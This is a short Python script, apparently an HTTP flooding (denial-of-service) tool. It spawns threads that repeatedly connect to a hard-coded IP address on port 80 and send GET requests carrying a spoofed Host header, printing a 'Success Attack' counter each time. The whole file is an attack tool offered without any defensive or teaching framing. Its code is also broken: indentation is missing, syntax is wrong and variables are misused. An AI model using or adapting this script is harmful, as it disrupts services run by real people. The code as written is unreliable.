import socket
import threading

target = "217.15.165.191"
fake_ip = "277.15.165.199"
port = 80

attack_num = 0


def attack():
while True:
soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
soc.connect((target, port))

soc.sendto(("GET /"+target+" HTTP/1.1\r\n")).encode("ascii"), (target, port))

soc.sendto(("Host: "+fake_ip+"\r\n\r\n").encode("ascii"), (target, port))

global attack_num
attack num += 1
print(f'Success Attack {target} :{attack_num}')

soc.close()


for i in range(10):
thread = threading.Thread(target=attack)
target.start()
